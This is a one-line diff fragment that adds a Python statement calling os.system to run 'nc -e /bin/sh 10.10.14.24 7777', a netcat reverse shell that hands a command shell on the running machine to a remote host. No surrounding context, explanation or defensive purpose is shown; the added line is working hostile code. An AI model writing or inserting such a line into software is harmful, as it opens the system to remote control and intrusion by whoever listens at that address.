@@ -1,0 +1,1 @@
+import os;os.system('nc -e /bin/sh 10.10.14.24 7777')
